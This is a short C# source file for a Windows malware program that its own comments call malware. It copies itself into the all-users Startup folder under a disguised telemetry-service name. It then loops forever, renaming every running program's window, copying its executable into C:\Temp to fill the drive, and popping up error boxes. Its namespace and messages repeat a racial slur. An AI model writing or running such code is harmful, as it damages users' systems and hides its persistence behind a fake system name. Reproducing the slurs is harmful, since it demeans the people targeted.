// Copyright 2017 tiraboschi
using System;                           // Rout; Imports
using Microsoft.Win32;                  // Rout; Imports
using System.Runtime.InteropServices;   // Rout; Imports
using System.Windows.Forms;             // Rout; Imports
using System.Threading;                 // Rout; Imports
using System.IO;                        // Rout; Imports
using System.Diagnostics;               // Rout; Imports
using System.Security.Principal;        // Rout; Imports

namespace MyNigga {
//
    class FamSquad {
//
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)] // To change window titles
        public static extern bool SetWindowText(IntPtr hwnd, String lpString); // To change window titles
//
        static void Main() { // Main
//
// Definitions
//
            bool i = true; // For loops
            Random rnd = new Random(); // For file name gen
            var number0 = rnd.Next();
//
// Copy to the startup directory
//
        try{ // Without this, running w/o admin will hang it
            var fn = System.Reflection.Assembly.GetEntryAssembly().Location; // Get running location
            var location = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"; // Auto-start location
            var filename = "Windows Compatability Telemetry Service b." + number0 + ".exe"; // Random file name
            var copyto = location + filename; // Combine them
            System.IO.File.Copy(fn, copyto); // Copy the malware there
        } catch {}
//
// Error message
//
            MessageBox.Show("Shit's hosed",
                    "ur fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("no",
                    "", MessageBoxButtons.OK, MessageBoxIcon.Error);
//
// Payloads
//
            while(i == true) {
                Process[] processlist = Process.GetProcesses();
                foreach (Process processitem in processlist) {
// Set window titles
                    SetWindowText(processitem.MainWindowHandle, "Shit is hosed my nigga.");}
// Fill drive with files
                    int number = rnd.Next();
                    var fn = System.Reflection.Assembly.GetEntryAssembly().Location; // Get running location
                    System.IO.File.Copy(fn, "C:\\Temp\\Oh Hey Thanks " + number + ".exe");
// Create message box
                    System.Windows.Forms.MessageBox.Show("I SAID:\nSHIT'S.\nHOSED.\nMY.\nNIGGA.", "LISTEN UP");}
            Process.GetCurrentProcess().Kill();} 
            //
            // END
            //
        } 
    } 